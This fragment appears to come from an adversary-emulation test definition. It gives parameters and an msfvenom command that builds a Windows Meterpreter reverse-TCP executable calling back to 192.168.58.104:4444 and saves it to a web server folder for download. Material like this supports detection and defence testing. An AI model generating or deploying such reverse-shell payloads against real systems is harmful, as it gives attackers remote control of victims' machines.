<<parameters
Name	Description	Type	Default Value
payload	payload	String	windows/meterpreter/reverse_tcp
LHOST	LHOST	String	192.168.58.104
LPORT	LPORT	String	'4444'
format	format	String	exe
output_path	output_path	String	/var/www/html/rs_exploit.exe
parameters

msfvenom -p #{payload} LHOST=#{LHOST} LPORT=#{LPORT} -f #{format} -o #{output_path}

